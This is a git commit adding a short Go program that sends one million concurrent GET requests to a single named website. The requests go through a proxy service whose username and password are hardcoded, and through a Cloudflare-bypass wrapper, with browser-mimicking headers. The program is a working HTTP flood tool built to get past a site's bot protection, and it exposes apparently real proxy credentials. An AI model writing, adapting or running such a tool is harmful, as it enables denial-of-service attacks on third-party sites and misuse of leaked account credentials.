b6f8512a292c693bedf652d5e45d55a12b18d4f3
woosh <51231397+w8y@users.noreply.github.com>
2023-02-05 15:39:09 +0000

    Add files via upload

---
+++ main.go
@@ -0,0 +1,65 @@
+package main
+
+import (
+	"fmt"
+	// "io/ioutil"
+	"net/http"
+	"sync"
+	"os"
+	"github.com/DaRealFreak/cloudflare-bp-go"
+	// "math/rand"
+)
+
+func main() {
+	url := "https://lay.rip/snep"
+	os.Setenv("HTTP_PROXY", "http://brd-customer-hl_8e3cfc05-zone-zone1:20b7sqdpne8i@zproxy.lum-superproxy.io:22225")
+	os.Setenv("HTTPS_PROXY", "http://brd-customer-hl_8e3cfc05-zone-zone1:20b7sqdpne8i@zproxy.lum-superproxy.io:22225")
+	var wg sync.WaitGroup
+	semaphore := make(chan struct{}, 500)
+	for i := 0; i < 1000000; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			semaphore <- struct{}{}
+			req, err := http.NewRequest("GET", url, nil)
+			if err != nil {
+				fmt.Println(err)
+				<-semaphore
+				return
+			}
+
+			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3")
+			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+			req.Header.Set("Accept-Language", "en-US")
+			req.Header.Set("Upgrade-Insecure-Requests", "1")
+			req.Header.Set("Cache-Control", "max-age=0")
+			req.Header.Set("DNT", "1")
+			req.Header.Set("Connection", "keep-alive")
+
+			client := &http.Client{}
+			client.Transport = &http.Transport{Proxy: http.ProxyFromEnvironment} // use proxy
+			client.Transport = cloudflarebp.AddCloudFlareByPass(client.Transport)
+			resp, err := client.Do(req)
+			if err != nil {
+				fmt.Println(err)
+				<-semaphore
+				return
+			}
+			defer resp.Body.Close()
+			
+			//body, err := ioutil.ReadAll(resp.Body)
+			//if err != nil {
+			//	fmt.Println(err)
+			//	<-semaphore
+			//	return
+			//}
+
+			// fmt.Println(string(body))
+			fmt.Println("URL:", resp.Request.URL)
+			fmt.Println("Status code:", resp.StatusCode)
+			<-semaphore
+		}()
+	}
+
+	wg.Wait()
+}
